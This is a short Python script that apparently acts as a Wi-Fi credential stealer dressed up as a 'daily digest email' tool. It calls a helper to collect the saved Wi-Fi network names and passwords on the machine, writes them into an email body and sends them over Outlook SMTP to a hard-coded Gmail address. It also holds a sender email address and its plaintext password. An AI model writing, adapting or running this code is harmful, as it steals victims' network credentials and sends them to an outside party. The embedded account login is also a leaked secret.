import get_WiFi_Passwords
import datetime
import smtplib
from email.message import EmailMessage

class DailyDigestEmail:

    def __init__(self):
        self.content = get_WiFi_Passwords.getCredentials()

        self.recipients_list = ['alhad.manure@gmail.com']

        self.sender_credentials = {'email': 'alhad.sample1@outlook.com', # your sender email address
                                   'password': 'AlhadSample1!'} # your sender password

    def creatEmailText(self):
        emailText = f'Credentials \n'
        for wifi in self.content:
            emailText+= f'ssid: {wifi["ssid"]}, password: {wifi["password"]} \n'
        return emailText
    
    """
    Send digest email to all recipients on the recipient list.
    """
    def send_email(self):
        # build email message
        msg = EmailMessage()
        msg['Subject'] = f'WiFi Collector - {datetime.date.today().strftime("%d %b %Y")}'
        msg['From'] = self.sender_credentials['email']
        msg['To'] = ', '.join(self.recipients_list)

        # add Plaintext and HTML content
        msg.set_content(self.creatEmailText())
        #msg.add_alternative(msg_body['html'], subtype='html')

        # secure connection with STMP server and send email
        with smtplib.SMTP('smtp-mail.outlook.com', 587) as server:
            server.starttls()
            server.login(self.sender_credentials['email'], self.sender_credentials['password'])
            server.send_message(msg)

if __name__ == '__main__':
    email = DailyDigestEmail()

    ##### test format_message() #####
    print('\nTesting email body generation...')

    # save Plaintext and HTML messages to file
    #with open('message_text.txt', 'w', encoding='utf-8') as f:
        #f.write(email.creatEmailText())


    ##### test send_email() #####
    print('\nSending test email...')
    email.send_email()